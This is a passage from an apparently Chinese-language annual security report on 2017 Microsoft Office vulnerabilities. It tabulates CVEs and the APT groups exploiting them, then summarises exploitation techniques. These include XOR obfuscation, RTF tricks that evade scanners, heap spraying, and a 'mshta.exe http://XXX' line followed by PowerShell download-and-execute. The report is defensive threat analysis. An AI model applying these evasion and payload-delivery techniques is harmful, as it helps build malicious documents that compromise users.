<td width="105">**CVE-2017-0262**</td><td width="123">EPS中的类型混淆漏洞</td><td width="110">FireEye，ESET</td><td width="110">APT28</td><td width="105">不详</td>
<td width="105">**CVE-2017-0199**</td><td width="123">OLE对象中的逻辑漏洞</td><td width="110">FireEye</td><td width="110">被多次利用</td><td width="105">被多次利用</td>
<td width="105">**CVE-2017-8570**</td><td width="123">OLE对象中的逻辑漏洞(CVE-2017-0199的补丁绕过)</td><td width="110">McAfee</td><td width="110">无</td><td width="105">不详</td>
<td width="105">**CVE-2017-8759**</td><td width="123">.NET Framework中的逻辑漏洞</td><td width="110">FireEye</td><td width="110">被多次利用</td><td width="105">被多次利用</td>
<td width="105">**CVE-2017-11292**</td><td width="123">Adobe Flash Player类型混淆漏洞</td><td width="110">Kaspersky</td><td width="110">BlackOasis</td><td width="105">APT28</td>
<td width="105">**CVE-2017-11882**</td><td width="123">公式编辑器中的栈溢出漏洞</td><td width="110">embedi</td><td width="110">无</td><td width="105">Cobalt，APT34</td>
<td width="105">**CVE-2017-11826**</td><td width="123">OOXML解析器中的类型混淆漏洞</td><td width="110">奇虎360</td><td width="110">被某APT组织利用</td><td width="105">不详</td>

同时，对 Office 漏洞做下分类总结：
- 逻辑型漏洞
CVE-2017-0199 为典型的逻辑漏洞，微软对其采取了“COM Activation Filter”修补机制，仅仅是封锁 “htafile”对象和 “script”对象的方法。CVE-2017-8570 借助其他 CLSID对象便可绕过。CVE-2017-8759 为 wsdl 的 xml 处理不当引起的逻辑漏洞，未能考虑到包含 CRLF 序列数据的情况。soap:address location内容有可能存在换行符，导致注释指令“//”只对第一行生效，其余则作为有效代码正常执行。
- 内存破坏型漏洞
CVE-2017-0262，CVE-2017-11292 和 CVE-2017-11826 都是类型混淆漏洞，攻击者可以利用该漏洞改变执行流程，将值控制到操作数的堆栈上。CVE-2017-11882 为栈溢出漏洞。EQNEDT32.EXE 在 17年前编译后再未更改，当时没有采取任何漏洞缓解措施，导致该漏洞利用难度低且通杀各个版本 office。

攻击手法的总结：
- 混淆
许多安全产品依然无法对已知漏洞进行完全防护。攻击者常常利用一些混淆技术，来绕过安全软件的检测。例如在 CVE2017-0262中 EPS 利用文件通过一个简单的 XOR 混淆，以十六进制字符串形式进行存放。使用的密钥 0xc45d6491 放于头部，而 exec 被解密的缓存所调用。对于流行的 RTF 文档攻击，一些安全软件通常无法正确分类 RTF 文件格式并扫描 RTF 中嵌入的 OLE 文档。修改 RTF 文件的“`{`\ rtN”字段，使部分工具无法正确检测文件类型，或者利用一些被 office 忽略的特殊字符，如“.`}`”’、“`{`”’，第三方分析器可能会将这些字符识别为数据的结尾并截断 OLE。
- 堆喷
堆喷是很常见的内存布局技巧，用来控制 EIP。在 CVE2017-11826的利用样本中，包含的一个 OLE 对象用来做堆喷。但是这种利用方法并不稳定，且耗时比较长，在不同环境下利用效果具有差异性。Office 2013 版本以后将没有开启 ASLR 的 dll 强制地址随机化，那么在高版本中，这种利用方法更难成功。
- HTA 和 Powershell
攻击者常常利用漏洞从远程获取恶意软件或者攻击负载，使得安全软件和沙箱难以准确地检测这些攻击行为。这种情况最常见的手法是利用带有“mshta.exe http://XXX”的命令，从远程服务器上拉取 hta 文件执行其中 VB 脚本，如果加载其他恶意软件的话，可以利用 VB 调用 powershell 的 DownloadFile;StartProcess的方式进行执行。这种攻击手法不仅减小了攻击文件的体积，并且避免了可利用内存不足的情况。

Office 安全问题不只有其自身的漏洞，其他漏洞在 Office 情境下的利用我们也需要注意。从 2017 年初至今，以 CVE-2017-0199 为代表，针对 Office 进行的漏洞攻击明显增长。CVE2017-0262，CVE–2017–8759等多个漏洞已经被利用到实际攻击中。根据今年几个 Office 漏洞的特点，我们相信在未来一段时间，使用 CVE-2017-0199，CVE-2017-11882 的攻击，依然会持续。

## 参考

[https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/](https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/)

[https://securelist.com/blackoasis-apt-and-new-targeted-attacks-leveraging-zero-day-exploit/82732/](https://securelist.com/blackoasis-apt-and-new-targeted-attacks-leveraging-zero-day-exploit/82732/)

[https://github.com/MerStara/awesome-cve-poc](https://github.com/MerStara/awesome-cve-poc)

[https://portal.msrc.microsoft.com/zh-cn/security-guidance](https://portal.msrc.microsoft.com/zh-cn/security-guidance)

[https://www.anquanke.com/post/id/87154](https://www.anquanke.com/post/id/87154)

[https://www.anquanke.com/post/id/87000](https://www.anquanke.com/post/id/87000)

[https://www.anquanke.com/post/id/86833](https://www.anquanke.com/post/id/86833)

[https://www.anquanke.com/post/id/86582](https://www.anquanke.com/post/id/86582)

[https://www.anquanke.com/post/id/86848](https://www.anquanke.com/post/id/86848)

[https://www.anquanke.com/post/id/87026](https://www.anquanke.com/post/id/87026)

[https://www.anquanke.com/post/id/86063](https://www.anquanke.com/post/id/86063)

完整报告下载：[https://cert.360.cn/static/files/2017%E5%B9%B4%E5%BA%A6%E5%AE%89%E5%85%A8%E6%8A%A5%E5%91%8A–Office.pdf](https://cert.360.cn/static/files/2017%E5%B9%B4%E5%BA%A6%E5%AE%89%E5%85%A8%E6%8A%A5%E5%91%8A--Office.pdf)
